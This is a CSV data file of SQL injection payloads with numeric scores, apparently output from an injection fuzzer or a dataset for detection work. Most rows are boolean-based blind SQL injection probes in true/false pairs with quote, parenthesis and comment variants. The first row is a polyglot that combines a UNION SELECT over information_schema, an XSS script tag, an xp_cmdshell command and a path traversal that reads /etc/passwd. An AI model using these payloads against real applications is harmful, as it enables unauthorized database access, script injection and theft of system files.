payload,score
"['9667 AND 1=1 UNION ALL SELECT 1,NULL,\'<script>alert(""XSS"")</script>\',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell(\'cat ../../../etc/passwd\')#']",4089
['6777'],0
['1) AND 4457=4305 AND (5446=5446'],89
['1) AND 1098=1098 AND (8926=8926'],89
['1 AND 3304=7096'],73
['1 AND 1098=1098'],73
['1 AND 3158=7864-- rJKW'],80
['1 AND 1098=1098-- sEwl'],80
"[""1' AND 6050=1028 AND 'vLxo'='vLxo""]",0
"[""1' AND 1098=1098 AND 'LKxs'='LKxs""]",91
"[""1' AND 7936=7457 AND 'NqfU'='NqfU""]",0
['(SELECT (CASE WHEN (8972=2619) THEN 1 ELSE (SELECT 2619 UNION SELECT 6381) END))'],0
['(SELECT (CASE WHEN (3007=3007) THEN 1 ELSE (SELECT 7410 UNION SELECT 4783) END))'],0
['1) AND 2914=9953#'],75
['1) AND 9088=9088#'],75
['1)) AND 7337=6601#'],76
['1)) AND 9088=9088#'],76
['1))) AND 8376=3732#'],77
['1))) AND 9088=9088#'],77
['1 AND 5363=8748#'],74
['1 AND 9088=9088#'],74
['1)) AS wwKx WHERE 6346=6346 AND 4959=8976#'],100
['1)) AS BQSv WHERE 1014=1014 AND 9088=9088#'],100
['1) AS eoUn WHERE 5909=5909 AND 6876=3077#'],99
['1) AS nQJq WHERE 2876=2876 AND 9088=9088#'],99
['1` WHERE 6655=6655 AND 8755=6220#'],91
['1` WHERE 5200=5200 AND 9088=9088#'],91
['1`) WHERE 1819=1819 AND 6416=5177#'],92
['1`) WHERE 2572=2572 AND 9088=9088#'],92
"[""1' AND 6456=7701#""]",0
"[""1' AND 9088=9088#""]",75
"[""1' AND 9450=4902#""]",0
"['1"" AND 6216=4600#']",75
"['1"" AND 9088=9088#']",75
"['1"") AND 6724=8356#']",76
"['1"") AND 9088=9088#']",76
"['1"")) AND 3436=7113#']",77
"['1"")) AND 9088=9088#']",77
"['1""))) AND 9631=2885#']",78
"['1""))) AND 9088=9088#']",78
"['1"")) AS tyxE WHERE 6271=6271 AND 4545=5531#']",101
"['1"")) AS nKxc WHERE 6438=6438 AND 9088=9088#']",101
"['1"") AS vjVb WHERE 3705=3705 AND 6330=3859#']",100
"['1"") AS YTLx WHERE 2238=2238 AND 9088=9088#']",100
['-9895'],0
['-6341) OR 4364=6187#'],0
['-2008) OR 3651=3651#'],0
['-3690)) OR 9713=8189#'],0
['-6262)) OR 3651=3651#'],0
['-1086))) OR 6724=8029#'],0
['-7901))) OR 3651=3651#'],0
['-5285 OR 4349=4062#'],0
['-5040 OR 3651=3651#'],0
['-2272)) AS QAWP WHERE 7211=7211 OR 3581=6817#'],0
['-8229)) AS DFqY WHERE 4052=4052 OR 3651=3651#'],0
['-2728) AS OJHo WHERE 1413=1413 OR 2438=2679#'],0
['-9445) AS jvAS WHERE 9551=9551 OR 3651=3651#'],0
"[""-5685' OR 3540=7362#""]",0
"[""-7852' OR 3651=3651#""]",387
"[""-9739' OR 7831=7702#""]",0
"['-5050"" OR 1153=4039#']",0
"['-9066"" OR 3651=3651#']",0
"['-3929"") OR 8426=2553#']",0
"['-3941"") OR 3651=3651#']",0
"['-7788"")) OR 7562=7203#']",0
"['-5273"")) OR 3651=3651#']",0
"['-7427""))) OR 9127=5684#']",0
"['-6492""))) OR 3651=3651#']",0
"['-8381"")) AS GeJv WHERE 2120=2120 OR 8830=6696#']",0
"['-8391"")) AS FoKJ WHERE 2277=2277 OR 3651=3651#']",0
"['-5572"") AS APPK WHERE 5413=5413 OR 1830=6032#']",0
"['-2989"") AS wwvD WHERE 6243=6243 OR 3651=3651#']",0
['1) OR NOT 3337=8107#'],78
['1) OR NOT 8431=8431#'],78
['1)) OR NOT 9247=3002#'],79
['1)) OR NOT 8431=8431#'],79
['1))) OR NOT 3009=1824#'],80
['1))) OR NOT 8431=8431#'],80
['1 OR NOT 6295=8913#'],77
['1 OR NOT 8431=8431#'],77
['1)) AS DsRV WHERE 1094=1094 OR NOT 2419=9883#'],103
['1)) AS DLOL WHERE 3628=3628 OR NOT 8431=8431#'],103
['1) AS IsWo WHERE 3467=3467 OR NOT 9712=5738#'],102
['1) AS uFiE WHERE 2953=2953 OR NOT 8431=8431#'],102
['1` WHERE 3212=3212 OR NOT 7680=2068#'],94
['1` WHERE 2818=2818 OR NOT 8431=8431#'],94
['1`) WHERE 5186=5186 OR NOT 6366=2332#'],95
['1`) WHERE 6740=6740 OR NOT 8431=8431#'],95
"[""1' OR NOT 6346=2407#""]",387
